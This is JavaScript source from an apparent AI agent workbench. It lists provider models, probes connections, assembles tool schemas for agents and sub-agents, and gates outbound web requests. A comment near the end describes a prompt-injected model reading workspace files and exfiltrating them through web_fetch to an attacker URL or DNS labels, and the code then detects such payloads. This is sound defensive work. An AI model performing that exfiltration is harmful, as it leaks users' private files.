// Best-effort model list from a provider's GET …/models. Never throws. 端点与请求头按协议问 04i 的登记表(与补全请求同一份)。
async function fetchOpenAiModels(provider, timeoutMs = 4000) {
  const wire = providerWireProtocol(provider);
  const modelsUrl = wire.modelsUrl(provider && provider.baseUrl);
  if (!modelsUrl || typeof fetch !== 'function') return { ok: false, error: modelsUrl ? 'fetch unavailable' : 'no base URL', models: [] };
  const headers = wire.requestHeaders(provider);
  const ctrl = typeof AbortController === 'function' ? new AbortController() : null;
  const timer = ctrl ? setTimeout(() => { try { ctrl.abort(); } catch { /* ignore */ } }, timeoutMs) : null;
  try {
    const res = await fetch(modelsUrl, { headers, signal: ctrl ? ctrl.signal : undefined });
    if (!res || !res.ok) return { ok: false, error: 'HTTP ' + (res ? res.status : '?'), models: [] };
    // 200 却不是 JSON(/models 被 SPA 兜底页 / 反代的登录页 / 空体顶掉):这不是「连接失败」,是「这个端点没有模型清单」。
    // 带 notAList 交给「测试连接」当缺清单处理(改用补全试探);超时中止(AbortError)照旧往外抛给下面的 catch。
    let body;
    try { body = await res.json(); }
    catch (parseError) {
      if (parseError && parseError.name === 'AbortError') throw parseError;
      return { ok: false, error: 'HTTP ' + res.status + ': the response is not a model list (not JSON)', notAList: true, models: [] };
    }
    const data = Array.isArray(body && body.data) ? body.data : (Array.isArray(body) ? body : []);
    // v1.0.2-S2: 同时保留上游条目里的 context_length 类字段(取第一个正数), 存为 contextLength,
    // 并按 provider+model 写入探测缓存(TTL 10 分钟), 供 providerContextWindow 解析激活模型时查用。
    const models = data
      .map(m => {
        if (typeof m === 'string') return { id: m, label: m };
        const id = String(m.id || m.model || '').trim();
        const out = { id, label: id };
        const ctx = extractContextLength(m);
        if (ctx) out.contextLength = ctx;
        return out;
      })
      .filter(m => m.id);
    // Ollama's OpenAI-compatible /v1/models omits context length, while its native /api/show reports
    // `<architecture>.context_length`. Probe the same configured origin (no new host) so local compactors
    // budget against their real window instead of the generic 64K fallback.
    let ollamaOrigin = '';
    try {
      const configured = new URL(String(provider && provider.baseUrl || ''));
      if (/ollama/i.test(String(provider && (provider.id + ' ' + provider.label) || '')) || configured.port === '11434') ollamaOrigin = configured.origin;
    } catch { /* non-URL base was already rejected above */ }
    if (ollamaOrigin) {
      await Promise.all(models.filter(m => !m.contextLength).slice(0, 32).map(async m => {
        try {
          const shown = await fetch(ollamaOrigin + '/api/show', {
            method: 'POST', headers, body: JSON.stringify({ model: m.id }), signal: ctrl ? ctrl.signal : undefined,
          });
          if (!shown || !shown.ok) return;
          const detail = await shown.json();
          const info = detail && detail.model_info;
          if (!info || typeof info !== 'object') return;
          const pair = Object.entries(info).find(([name, value]) => /(?:^|\.)context_length$/i.test(name) && Number(value) > 0);
          if (pair) m.contextLength = Math.round(Number(pair[1]));
        } catch { /* OpenAI-compatible but not native Ollama, or native probe unavailable */ }
      }));
    }
    const providerId = provider && provider.id;
    for (const m of models) if (m.contextLength) cacheContextLength(providerId, m.id, m.contextLength);
    return { ok: true, models };
  } catch (e) {
    return { ok: false, error: (e && e.name === 'AbortError') ? 'timeout' : ((e && e.message) || 'fetch failed'), models: [] };
  } finally { if (timer) clearTimeout(timer); }
}
// 「测试连接」的第二条路:端点不提供模型清单(多数 Anthropic 兼容网关的 /anthropic/v1/models 是 404,一些 OpenAI 兼容
// 内网网关也没有 /models)时,用填好的模型发一次最小的非流式补全来确认地址、密钥与模型都对。用短补全的编码(400 token、
// 尽量关思考),失败时回 'HTTP <status>: <正文开头>' 供调用方分类。Never throws.
async function probeProviderCompletion(provider, model, timeoutMs = 15000) {
  const wire = providerWireProtocol(provider);
  const url = wire.completionUrl(provider && provider.baseUrl);
  if (!url || typeof fetch !== 'function') return { ok: false, error: url ? 'fetch unavailable' : 'no base URL' };
  const body = wire.encodeQuick({ model, messages: [{ role: 'user', content: 'ping' }], plain: true, provider });
  const ctrl = typeof AbortController === 'function' ? new AbortController() : null;
  const timer = ctrl ? setTimeout(() => { try { ctrl.abort(); } catch { /* ignore */ } }, timeoutMs) : null;
  try {
    const requestBody = typeof PrivacyGateway !== 'undefined' ? await PrivacyGateway.beforeModelRequest(body) : body;
    if (typeof PrivacyGateway !== 'undefined') PrivacyGateway.assertPolicyAvailable();
    const res = await fetch(url, { method: 'POST', headers: wire.requestHeaders(provider, { model }), body: JSON.stringify(requestBody), signal: ctrl ? ctrl.signal : undefined });
    const raw = await res.text().catch(() => '');
    // 报文原样回给界面之前,先把本次请求带出去的凭据按字面抹掉再截断(先截会把横跨 300 字边界的 key 切成认不出的半截)。
    if (!res.ok) return { ok: false, status: res.status, error: 'HTTP ' + res.status + (raw ? ': ' + providerScrubSecrets(raw, provider).replace(/\s+/g, ' ').slice(0, 300) : '') };
    let payload = null; try { payload = JSON.parse(raw); } catch { payload = null; }
    const decoded = payload ? wire.decodeCompletion(payload, { requestModel: model }) : null;
    if (decoded && decoded.failed) return { ok: false, error: String(decoded.failureText || 'provider error').slice(0, 300) };
    return { ok: true };
  } catch (e) {
    return { ok: false, error: (e && e.name === 'AbortError') ? 'timeout' : ((e && e.message) || 'fetch failed') };
  } finally { if (timer) clearTimeout(timer); }
}
// v0.6: expose the workbench's own tools to a native provider as OpenAI function-calling schema.
// Same tools the MCP server exposes (minus the internal permission bridge), filtered by the
// command/desktop toggles. The native agent loop executes them in-process via toolCall().
// v0.9-S6: `opts` gates the two sub-agent-specific behaviors (all optional; the top-level provider turn
// passes none, preserving prior behavior):
//   opts.tierFilter : 'read' | 'edit' | 'exec' — keep only tools at or below this native tier (used by
//     runSubAgent to enforce toolTier: read=only read-tier, edit=read+edit, exec=all). Absent → no filter.
//   opts.noMemoryWriteTools : true → 不 offer 记忆写工具(propose / revise / relation_*;子代理用,见 MEMORY_WRITE_TOOL_NAMES)
//   opts.noAgentTools : true → never include the agent tools orchestrate_agents / wait_agents / agent_result
//     (禁嵌套: sub-turns pass this). The top-level turn omits it and lets the subagentMaxPerTurn>0 check decide.
// 代理模式 v2:模型侧的三个代理工具(单一启动入口 + 收件 + 取全文)。offer 门、禁嵌套压制、按需装载分类共用这张表。
const AGENT_TOOL_NAMES = new Set(['orchestrate_agents', 'wait_agents', 'agent_result']);
// 走查 #15:子代理不拿的记忆【写】工具。它们只写候选槽,而候选槽是父会话每回合唯一的一个 —— 子代理以 parentSession 的身份调用,
// 写了就占掉主模型的槽(同回合先到者胜,主模型反而得到 alreadyPending),卡片上还看不出是谁提的。list / read 是只读,留着。
// offer 面(buildOpenAiTools 的 opts.noMemoryWriteTools)与分发面(08 子代理循环的拒绝分支)共用这一张表。
const MEMORY_WRITE_TOOL_NAMES = new Set(['workbench_memory_propose', 'workbench_memory_revise', 'workbench_memory_relation_propose', 'workbench_memory_relation_revoke']);
// 能力总闸(allowDesktopTools 的会话级覆盖)要的会话头:回合内的调用 ctx 带 session;MCP 子进程(Claude / Kimi CLI 经如意 MCP)
// 里 ctx 为空,按注入的 WCW_SESSION_ID 装(与下面桥接分支的 sidSession、journalSessionCtx 同一个来源)。装不到 = null = 跟随全局。
async function policySessionFor(ctx) {
  if (ctx && ctx.session) return ctx.session;
  const sid = process.env.WCW_SESSION_ID || '';
  if (!sid) return null;
  try { return (await loadSession(sid)) || null; } catch { return null; }
}
async function policyDesktopOverrideFor(ctx) {
  const session = await policySessionFor(ctx);
  return session ? sessionDesktopToolsOf(session) : null;
}

const { dropPolicyDisabledBridgedTools } = require('./backend/bridged-tool-policy.cjs');

function toolDisabledResult(name, reason) {
  const unsupported = reason.startsWith('platform.unsupported:');
  return { ok: false, code: 'tool-disabled', error: unsupported ? `tool '${name}' is unavailable (${reason})` : `tool '${name}' is disabled by settings (${reason})`,
    hint: unsupported ? '请使用当前工具目录中可用的工具；开启设置不能补齐平台实现。' : '该工具已被设置关闭;请改用其它已提供的工具,或让用户在设置里开启后再试。' };
}
// 审计 N5:按名字取原生工具自己的 JSON schema(13f MCP_TOOLS),供分发前的入参校验(12 validateNativeToolArgs)。
// 放在 07 而不是 12:07 本就读 MCP_TOOLS,12 再读就是新增一条前向边(module-dependency-graph 的债务上限会红)。
// C2:13f 的 PROVIDER_SESSION_TOOL_SCHEMAS(只发给模型服务商主回合、不进 MCP_TOOLS 的 scratchpad_write)同走这道校验。
let _nativeToolSchemaByName = null;
function nativeToolSchema(name) {
  if (!_nativeToolSchemaByName) {
    _nativeToolSchemaByName = new Map();
    for (const t of MCP_TOOLS.concat(PROVIDER_SESSION_TOOL_SCHEMAS)) if (t && t.name && t.inputSchema) _nativeToolSchemaByName.set(t.name, t.inputSchema);
  }
  return _nativeToolSchemaByName.get(name) || null;
}
// 12 的「代理漏写目标名」错误按模型给的参数键猜候选目标(只做提示):给出的键全是该工具的参数、且该工具的必填全在其中。
// 返回 [{ name, tier, required }](required = 必填个数,越多越具体);放在 07 的理由同上(07 本就读 MCP_TOOLS)。
function nativeToolsAcceptingArgKeys(keys) {
  const want = (Array.isArray(keys) ? keys : []).filter(k => typeof k === 'string' && k);
  if (!want.length) return [];
  const out = [];
  for (const t of MCP_TOOLS) {
    const schema = t && t.inputSchema;
    const props = (schema && schema.properties && typeof schema.properties === 'object') ? schema.properties : {};
    const required = Array.isArray(schema && schema.required) ? schema.required : [];
    if (!want.every(k => Object.prototype.hasOwnProperty.call(props, k))) continue;
    if (!required.every(k => want.includes(k))) continue;
    out.push({ name: t.name, tier: nativeToolTier(t.name), required: required.length });
  }
  return out;
}
function buildOpenAiTools(config, caps, opts) {
  // 116f: 管家会话标记。为 true 时本函数【只】返回 steward_*(收口在末尾的唯一出口,见那里的注释)。
  const stewardSession = !!(opts && opts.stewardSession === true);
  // 117z-E2 提交①(27 号文 §11.21.3):桌面工具从「全局唯一一把闸」变成「全局闸 + 会话级覆盖」。
  // 【全局闸一个字没动】—— config.allowDesktopTools 仍然是 forbidden 清册里那一个键(06i:776),
  // 管家改不了它。opts.desktopOverride 是【另一把钥匙】,由调用方从会话头 session.desktopTools 取:
  //   null / undefined -> 跟随全局(= 修前逐字行为,全部存量会话与所有不传该键的调用方都走这一支);
  //   true             -> 这条线程拿得到桌面工具;
  //   false            -> 这条线程拿不到。
  // 拿不到 session 的调用方(子代理 08-agent-runs、各类探针与 e2e 直调)传 null 或干脆不传 —— 它们
  // 没有「这一条线程」这个概念,一律跟随全局。
  const desktopOverride = (opts && opts.desktopOverride != null) ? opts.desktopOverride : null;
  const out = [];
  const tierRank = TOOL_TIER_RANK; // P2-9: 单一事实源见 00-boot.js(117q-B7 从本文件移出)
  const tierFilter = opts && opts.tierFilter;
  const maxRank = (tierFilter && tierFilter in tierRank) ? tierRank[tierFilter] : null; // null → no tier filter
  const noAgentTools = !!(opts && opts.noAgentTools);
  // 代理模式 v2:三个代理工具(orchestrate_agents 启动 / wait_agents 收件 / agent_result 取全文)只在功能开启
  // (subagentMaxPerTurn>0,语义已平移到 orchestrate:本回合累计启动的节点数上限)且未被显式压制(子回合传
  // noAgentTools → 禁嵌套)时 offer。0 = 功能关 → 三个工具都不注册。
  const agentToolsEnabled = !noAgentTools && Number(config.subagentMaxPerTurn) > 0;
  // v0.8-S6: gate tools whose runtime requirements (TOOL_REQUIRES) are unmet by the capability matrix. The
  // testOnly entry only fires when config.enableToolRequiresProbe is set (see TOOL_REQUIRES note), so this
  // is inert in production until v0.9 populates the table. buildProviderSystemPrompt lists the filtered
  // tools under 「当前不可用」 so the model is told why they're absent.
  const toolRequiresEnabled = !!(config && config.enableToolRequiresProbe);
  for (const t of MCP_TOOLS) {
    if (t.name === 'list_tools' || t.name === 'tool_search' || t.name === 'tool_load' || t.name.startsWith('tool_invoke_')) continue;
    if (t.name === 'permission_prompt') continue;
    if (t.name === 'request_user_input' && noAgentTools) continue;
    if (AGENT_TOOL_NAMES.has(t.name) && !agentToolsEnabled) continue;
    if (opts && opts.noMemoryWriteTools === true && MEMORY_WRITE_TOOL_NAMES.has(t.name)) continue;
    if (nativeToolDisabledByPolicy(t.name, config, desktopOverride)) continue; // allowCommandTools / allowDesktopTools(offer 与分发共用同一判据)
    // 105a: observation_recall 仅在 recall+reducer 双开关生效时 offer;默认关 → 不出现在工具集。
    if (t.name === 'observation_recall' && !observationRecallEnabled(config)) continue;
    // 116c(27 号文 §3.5「分离」):管家工具族只对 kind==='steward' 的管家会话 offer —— 这是四个 offer
    // 面之一(其余三面:MCP tools/list 桥、adaptive 目录、/api/status 工具清单)。fail-closed:调用方
    // 不显式传 opts.stewardSession 就一律不 offer,普通会话与子代理回合永远看不到 steward_*。
    if (isStewardToolName(t.name) && !(opts && opts.stewardSession === true)) continue;
    // v0.9-S6: toolTier filter for sub-turns — drop any tool above the requested tier. orchestrate_agents (exec)
    // is already suppressed for sub-turns via noAgentTools, so it never survives an 'exec' sub-turn either.
    if (maxRank !== null && (tierRank[nativeToolTier(t.name)] ?? 2) > maxRank) continue;
    const needsRuntime = process.platform === 'darwin' && TOOL_REQUIRES[t.name]?.requires.some(cap => ['processSupervisor', 'desktopCapture'].includes(cap));
    if ((caps || needsRuntime) && !toolRequirementsMet(t.name, caps, toolRequiresEnabled, config).met) continue; // requirement unmet → drop
    out.push({ type: 'function', function: { name: t.name, description: t.description || t.name, parameters: t.inputSchema || { type: 'object', properties: {} } } });
  }
  // C2(61 号文)会话草稿本:只在调用方显式传 opts.scratchpadEnabled 时 offer —— 09 主回合对非管家会话传;08 子代理、
  // 管家会话(末尾唯一出口只留 steward_*)、各类探针不传。schema 在 13f PROVIDER_SESSION_TOOL_SCHEMAS(不进 MCP_TOOLS,
  // 所以 Claude/Kimi CLI 的 MCP 面、/api/status、代理目录天然没有它)。read 档,tierFilter 也挡不住它,照常过一遍。
  if (opts && opts.scratchpadEnabled === true) {
    for (const t of PROVIDER_SESSION_TOOL_SCHEMAS) {
      if (maxRank !== null && (tierRank[nativeToolTier(t.name)] ?? 2) > maxRank) continue;
      out.push({ type: 'function', function: { name: t.name, description: t.description || t.name, parameters: t.inputSchema || { type: 'object', properties: {} } } });
    }
  }
  // 代理模式 v2:wait_agents / agent_result 现随 MCP_TOOLS 一起 offer(上面的 AGENT_TOOL_NAMES 门),不再在此手工追加 ——
  // MCP 子进程侧靠 /api/agent-workflow/wait|result 回环,两面同一份 schema。
  // v1 技能体系: skill_read(provider 引擎, read tier)—— 仅在本会话有启用技能时注册(offer 条件由调用方传
  // opts.skillsEnabled 决定,仿代理工具的 enable 门)。不入 MCP_TOOLS(否则会泄漏给 Claude CLI 且恒开)。
  // 子代理不传 skillsEnabled → 不注册。dispatch 在 toolCall 的 'skill_read' 分支;tier 在 NATIVE_TOOL_TIER。
  if (opts && opts.skillsEnabled) {
    out.push({ type: 'function', function: {
      name: 'skill_read',
      description: '读取一个已启用技能的说明与目录。默认(仅传 id)返回 SKILL.md 全文 + 该技能目录内的文件清单;需要读取清单中的某个文件时,再次调用本工具并额外传 file(相对该技能目录的路径),返回该文件内容。仅能读取当前会话已启用的技能;id 为系统提示技能索引里方括号内的技能 id。',
      parameters: { type: 'object', properties: {
        id: { type: 'string', description: '技能 id(见系统提示的技能索引)' },
        file: { type: 'string', description: '可选。技能目录内的相对路径(见清单)。提供后返回该文件内容而非清单;仅限该技能目录内。' },
      }, required: ['id'] },
    } });
  }
  // 团队模式 v2 (A1): propose_task —— 子代理提案追加节点(元工具,provider 引擎,read tier)。仅在工作流子回合且池
  // 策略非 off 时注册(offer 由调用方 opts.proposeTaskEnabled 门控,仿 skill_read/代理工具的 enable 门)。不进
  // MCP_TOOLS(否则泄漏给 Claude CLI 且恒开)。dispatch 在 runSubAgentCore 的专用闭包分支,不走全局 toolCall。
  if (opts && opts.proposeTaskEnabled) {
    out.push({ type: 'function', function: {
      name: 'propose_task',
      description: '当你发现需要一个新的协作节点来完成某个子任务时,提交一个任务提案到本次运行的共享任务池,等待编排者审批。审批通过后它会作为一个新的工作流节点自动执行(走完整的资源/预算/记账管线)。这不会阻塞你——提交后立刻返回,你应继续完成自己当前的任务,不要等待它。',
      parameters: { type: 'object', properties: {
        task: { type: 'string', description: '新节点要完成的具体任务描述(必填)。' },
        roleId: { type: 'string', description: '可选。为新节点指定一个已有的 Agent 角色 id。' },
        dependsOn: { type: 'array', items: { type: 'string' }, description: '可选。新节点依赖的现有节点 id 列表;缺省依赖你自己(提案者)。' },
        resources: { type: 'array', items: { type: 'string' }, description: '可选。新节点声明的资源(用于并发排他/只读,格式同工作流节点)。' },
        toolTier: { type: 'string', enum: ['read', 'edit', 'exec'], description: '可选。新节点的工具级别,不得高于你自己的级别。' },
        model: { type: 'string', description: '可选。为新节点按任务难易指定模型 id(从系统提示里列出的、与新节点引擎匹配的可选模型中选;简单/大批量→快、复杂推理→强、其余→均衡;填错会让节点失败)。省略则继承你(提案者)的模型。' },
        reason: { type: 'string', description: '可选。给编排者看的一句话理由。' },
      }, required: ['task'] },
    } });
  }
  // send_to_agent：provider 主回合与工作流节点的定向参考消息(read tier)。opts.sendToAgentEnabled 控制 offer；
  // 节点邮箱与父/跨会话账本复用现有投递路径，返回真实排队/无法投递回执，下一模型边界收件，不自动唤醒。
  if (opts && opts.sendToAgentEnabled) {
    out.push({ type: 'function', function: {
      name: 'send_to_agent',
      description: '参考消息不改变任务或授权。下次模型调用前投递，不唤醒会话；终态或不支持收件则无法投递。',
      parameters: { type: 'object', properties: {
        action: { type: 'string', enum: ['send', 'status', 'list'], description: '默认send；status查本人回执（delivered仅指上下文注入）；list查节点状态/canReceive快照，不发信或扣配额。' },
        messageId: { type: 'string', description: 'status必填：消息回执ID。' },
        targetNodeKey: { type: 'string', description: '同run节点ID；子节点可填parent。' },
        runId: { type: 'string', description: '主会话send/status操作节点必填；list省略列本会话活run，指定可读历史。子节点绑定本run+parent。' },
        targetSessionId: { type: 'string', description: '主会话可选其他会话ID；与runId/targetNodeKey互斥。' },
        message: { type: 'string', description: 'send必填，最多2000字符。' },
      } },
    } });
  }
  if ((!opts || !opts.noAdaptiveMeta) && config && config.toolLoadingMode === 'auto') {
    // O1 (hb360): 注入含 tool_invoke_* 的完整 adaptive 元工具集 -- bridged 工具不自动注入 schema 后,
    // 模型需 tool_invoke_read/edit/exec 代理调用(按 tool_search 返回的 tier 选),否则 onDemand 引导的
    // 代理路径无工具可用。原 false 仅注入 list/search/load,OpenAI 引擎主回合缺 tool_invoke_*。
    for (const t of adaptiveMetaToolSchemas(true)) out.push({ type: 'function', function: { name: t.name, description: t.description, parameters: t.inputSchema } });
  }
  // 116f(27 号文 §3.5 硬边界「管家动如意,线程动世界」):管家会话的工具面【只有】steward_*。
  // 116c 的 isStewardToolName 门只解决了「普通会话拿不到管家工具」这半边;另半边同样是红线 ——
  // 管家会话【不得】拿到文件/shell/桌面/联网/编排/技能/元工具中的任何一个(tool_invoke_* 尤其危险:
  // 它是桥接工具的代理入口,漏一个就等于把整台电脑交给一个常在用户不在场时自主运行的回合)。
  // 收口放在唯一出口做一次,而不是给上面每一段(wait_agents/skill_read/propose_task/send_to_agent/
  // adaptive 元工具)各加一个门 —— 那样将来任何一段新增都可能漏门,这里漏的可能性为零。
  if (stewardSession) return out.filter(t => isStewardToolName(t && t.function && t.function.name));
  return out;
}
// v2.6 (loop guard 分层): 同签名连击(连续相同 name+rawArgs)对「无副作用」工具不应 abort ——
// 轮询/等待原语(相同参数反复调用是其设计语义: wait_agents 等后台 run 结束、shell_poll 读增量输出)
// 完全豁免同签名连击(不累计/不 warn/不 abort),无进展由语义指纹判定;只读工具(重复读无害)只 warn
// 不 abort;有副作用工具(edit/exec)保持 5 次 abort(重复执行=重复破坏)。
const LOOP_POLLING_TOOLS = new Set(['wait_agents', 'shell_poll']);
function loopAbortExempt(name) { return LOOP_POLLING_TOOLS.has(String(name || '').replace(/^.+?__/, '')); } // 轮询原语: 完全豁免
function loopWarnOnly(name) { return nativeToolTier(String(name || '').replace(/^.+?__/, '')) === 'read'; } // 无副作用只读: 只 warn 不 abort

// P2-14(30号文§3 总表): 死循环护栏数值 —— 主回合(09-workflow.js 的 LOOP_WARN_AT/LOOP_ABORT_AT/
// LOOP_RECOVERY_MAX)与子代理(08-agent-runs.js 的 SUB_LOOP_WARN_AT/SUB_LOOP_ABORT_AT/SUB_LOOP_RECOVERY_MAX)
// 各写一份完全相同的数值(3/5/2),两处注释互相点名「对称」。只抽这三个数值,不抽判定逻辑 —— 两边命中之后
// 的「配对铁律补答」各有必要差异(主回合数 toolCalls 数组、子代理数 subHistory 消息数组;主回合额外记
// mission 停滞账本、子代理不记;子代理事件带 subagentId/scope:'subagent'),强行合并成参数化大函数收益
// 不抵风险,明确不做。09/08 两处保留各自的局部变量名(LOOP_*/SUB_LOOP_*),只把右侧字面量改成引用这里。
const LOOP_GUARD_LIMITS = Object.freeze({ WARN_AT: 3, ABORT_AT: 5, RECOVERY_MAX: 2 });

const { bridgedToolTier } = require('./backend/bridged-tool-policy.cjs');

const {
  NATIVE_TOOL_PACKS, toolPackForName, classifyToolPacks, buildToolCatalog, searchToolCatalog,
  compareToolRetrievalShadow, listCompactTools, toolArgsSkeleton, createToolLoader,
} = require('./backend/tool-catalog.cjs');
const createToolLoadingState = createToolLoader({ logEvent });
const { classifyRuntimeToolFailure } = require('./backend/runtime-tool-telemetry.cjs');

// Decide gate for a tool call given the permission mode. Returns 'allow' | 'ask' | 'block'.
// 117m-A1(用户第六轮走查②「我已经默认线程全自动了,还是会有很多要求权限」):`auto` 档的 exec 分支
// 从「一律 ask」改成「高风险才 ask」。修前 `auto` 只放行 edit 档,exec 落到末尾的 `return 'ask'` ——
// 于是三处界面都把它叫「全自动」、管家壳的档位说明写「不再问你」,而线程每一步 script_run /
// http_request 仍旧弹权限,进收件箱、管家再起一个回合去「代批」(真机日志里 11 条
// intervention source:"steward_decision" action:"allow",两分钟一条,把每小时回合额度全吃光)。
// 高风险判据【复用既有单点】stewardToolPermanentlyExempt(06i):工具名正则 + 命令文本正则两道,
// 覆盖对外发送/支付/安装卸载/系统设置注册表/关机格式化/删除/git push。不另起一套判据 —— 那条
// 清单的纪律是「宁可误判成要人按,不可漏判成自动执行」,两个判据各写一份必然漂移。
// toolName 缺省(调用方没传)一律回落 'ask':保守优先,新调用面忘了传参不会静默放权。
// 模块方向:07 调 06i 是后向边(06i 在 manifest 里排 18,07 排 23),合法。
// 安全走查 S1(读档联网是无提示外传通道):web_fetch / web_search 在 NATIVE_TOOL_TIER 里是 read 档,nativeToolGate 对 read 在所有档位都放行 ——
// 被提示注入的模型可以 file_read 工作区里任何文件,再 web_fetch("https://攻击者/?d=<内容>") 无提示外传(SSRF 闸只挡内网,不挡公网目的地)。
// 联网搜索 / 抓取本身仍是 read 档(不整体变成要确认:日常研究要能无打扰地跑),但【看起来带了载荷】的请求在除 bypass 以外的所有档位先停下来问:
//   · 网址的查询串 + fragment 总长 > 256;
//   · 任一查询参数的值(解码后)> 128;
//   · 路径 / 参数 / fragment 里有 ≥ 64 字符的 hex 连续串,或「像 base64」的连续串(见 webLooksEncoded);
//   · 主机名里有 ≥ 48 字符的单个标签(DNS 外传:<编码数据>.攻击者.com;DNS 标签上限 63);
//   · web_search 的查询 > 300 字,或查询里有 ≥ 64 字符的编码串。
// 阈值依据:正常抓取 / 搜索的网址查询串几乎都在 100 字以内(搜索引擎结果页 ?q=…&hl=…、分页、utm 追踪参数一般 < 150),单个参数值很少过 100;
// 常见的长 ID 都 < 64:git 提交 SHA-1 40 位、Notion / Google Docs 文档 ID 32~44 位、UUID 36 位;256 / 128 / 64 都留了余量,又足以把「整份文件内容塞进网址」拦下。
// 没覆盖的(诚实):低于阈值的小额外传(一个 API key 约 50 字符、一个 32 位 token 能从阈值下面过去)—— 这条挡的是批量载荷,不是逐字符审计;
// 要杜绝得对「本回合读过本地文件之后的新域名」做确认(产品形态变更,未做)。
// 同一判据覆盖 http_request / http_download 的网址(读档以上的同类外联口:GET 带长查询串同样能外传),以及 CLI 引擎的 WebFetch / WebSearch。
// 第三波(复核 #2 / #7):另加三条整体长度判据 —— pathChars(路径【解码后】总长)、hostChars(主机名总长)、urlChars(整条网址原长);
// 查询串 / fragment 的 256 改按【解码后】计(中文搜索词一个字符编码成 9 个字符,30 个汉字就超了);用户信息段(`user:pass@`)一律问
// (Node 会把它发成 Authorization 头 —— 无提示外传通道;web_fetch 没有任何理由带凭据)。阈值依据:真实网址路径解码后极少过 200,
// 合法主机名几乎不超过 70(codespaces / vercel 预览域 ~60),整条网址过 1024 已超出多数服务端的 URL 上限。
const WEB_PAYLOAD_LIMITS = Object.freeze({ queryFragmentChars: 256, paramValueChars: 128, encodedRunChars: 64, hostLabelChars: 48, searchQueryChars: 300, pathChars: 300, hostChars: 100, urlChars: 1024 });
// 第三波(复核 #3):browser_open(原生与 ACC 的同名工具)= 把网址交给浏览器去 GET,ACC 的 fetch 同理;裸名匹配,mcp__server__ 前缀已被 webPayloadReason 剥掉。
// (ACC 的 browser_navigate 只有 back / forward / reload,没有网址入参,不在此列;管家的 steward_web_fetch / steward_web_search 不走本闸,见 13l。)
const WEB_PAYLOAD_URL_TOOLS = Object.freeze(['web_fetch', 'WebFetch', 'http_request', 'http_download', 'browser_open', 'fetch']);
const WEB_PAYLOAD_QUERY_TOOLS = Object.freeze(['web_search', 'WebSearch']);
// 「像编码出来的」:≥ encodedRunChars 的 hex 连续串;或 [A-Za-z0-9+/_=-] 连续串(base64 / base64url),且同时有字母和数字、连字符 / 下划线占比 ≤ 1/8
// (长文章 slug 如 how-to-install-…-2026 连字符多、词与词之间有分隔,不算;真 base64url 里 - _ 的期望占比约 3%)。
function webLooksEncoded(text) {
  const t = String(text == null ? '' : text);
  const n = WEB_PAYLOAD_LIMITS.encodedRunChars;
  if (t.length < n) return false;
  if (new RegExp('[0-9a-fA-F]{' + n + ',}').test(t)) return true;
  const runs = t.match(new RegExp('[A-Za-z0-9+/_=-]{' + n + ',}', 'g')) || [];
  for (const run of runs) {
    if (!/[0-9]/.test(run) || !/[A-Za-z]/.test(run)) continue;
    const seps = (run.match(/[-_]/g) || []).length;
    if (seps * 8 > run.length) continue;
    return true;
  }
  return false;
}
// 只做百分号解码,【不】把 + 当空格:标准 base64 里的 + 若按表单语义变成空格,连续串就被切断,载荷反而躲过了编码串判据(长度判据不受影响)。
function webSafeDecode(s) {
  const raw = String(s == null ? '' : s);
  try { return decodeURIComponent(raw); } catch { return raw; }
}
// 返回 '' = 不像载荷;否则是命中的判据名(进日志 / 子代理拒绝文案)。纯函数,不碰网络、不做 DNS。
function webUrlPayloadReason(url) {
  const s = String(url == null ? '' : url).trim();
  if (!s) return '';
  const hashAt = s.indexOf('#');
  const frag = hashAt >= 0 ? s.slice(hashAt + 1) : '';
  const noHash = hashAt >= 0 ? s.slice(0, hashAt) : s;
  const qAt = noHash.indexOf('?');
  const query = qAt >= 0 ? noHash.slice(qAt + 1) : '';
  const head = qAt >= 0 ? noHash.slice(0, qAt) : noHash;
  if (s.length > WEB_PAYLOAD_LIMITS.urlChars) return 'url_long';
  if (webSafeDecode(query).length + webSafeDecode(frag).length > WEB_PAYLOAD_LIMITS.queryFragmentChars) return 'query_fragment_long';
  const afterScheme = head.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '');
  const slashAt = afterScheme.indexOf('/');
  const hostPort = slashAt >= 0 ? afterScheme.slice(0, slashAt) : afterScheme;
  const pathPart = slashAt >= 0 ? afterScheme.slice(slashAt) : '';
  // 用户信息段:带口令(`user:pass@`)或长到能装数据(> 32 字符)一律问;`http://user@intranet.corp:8080/…` 这种只有短用户名的内网写法不算(既有零误伤样本)。
  const atAt = hostPort.lastIndexOf('@');
  if (atAt >= 0) { const userinfo = hostPort.slice(0, atAt); if (userinfo.length > 32 || userinfo.includes(':')) return 'userinfo'; }
  const host = (atAt >= 0 ? hostPort.slice(atAt + 1) : hostPort).replace(/:\d*$/, '');
  if (host.length > WEB_PAYLOAD_LIMITS.hostChars) return 'host_long';
  if (host.split('.').some(label => label.length >= WEB_PAYLOAD_LIMITS.hostLabelChars)) return 'host_label_long';
  if (webSafeDecode(pathPart).length > WEB_PAYLOAD_LIMITS.pathChars) return 'path_long';
  const values = [];
  for (const pair of query.split('&')) {
    if (!pair) continue;
    const eq = pair.indexOf('=');
    values.push(webSafeDecode(eq >= 0 ? pair.slice(eq + 1) : pair));
  }
  if (values.some(v => v.length > WEB_PAYLOAD_LIMITS.paramValueChars)) return 'param_long';
  // 第三波(复核 #7):`#diff-<64 位 hex>`(GitHub 的 diff 锚点)与 `sha256-<64 位 hex>` / `sha256:<64 位 hex>`(镜像 / 包的摘要)恰好 64 位 hex,是日常网址里
  // 仅有的几种「像编码」的正常写法;只摘掉【恰好 64 位】的这两种前缀形态再判(128 位 hex 之类仍命中),整体长度另有 pathChars / urlChars 兜着。
  const withoutDigests = piece => piece.replace(/(?:sha256[-:]|diff-)[0-9a-fA-F]{64}(?![0-9a-fA-F])/gi, '');
  const pieces = [...pathPart.split('/').map(webSafeDecode), ...values, webSafeDecode(frag)].map(withoutDigests);
  if (pieces.some(webLooksEncoded)) return 'encoded_run';
  return '';
}
// 工具名容忍 serverId__ / mcp__server__ 前缀(Claude 引擎经 MCP 叫的是 mcp__ruyi__web_fetch)。
function webPayloadReason(toolName, input) {
  const bare = String(toolName == null ? '' : toolName).replace(/^.*__/, '');
  if (!input || typeof input !== 'object' || Array.isArray(input)) return '';
  if (WEB_PAYLOAD_QUERY_TOOLS.includes(bare)) {
    const q = String(input.query == null ? '' : input.query);
    if (q.length > WEB_PAYLOAD_LIMITS.searchQueryChars) return 'search_query_long';
    if (q.split(/\s+/).some(webLooksEncoded)) return 'search_encoded_run';
    return '';
  }
  if (WEB_PAYLOAD_URL_TOOLS.includes(bare)) return webUrlPayloadReason(input.url);
  return '';
}
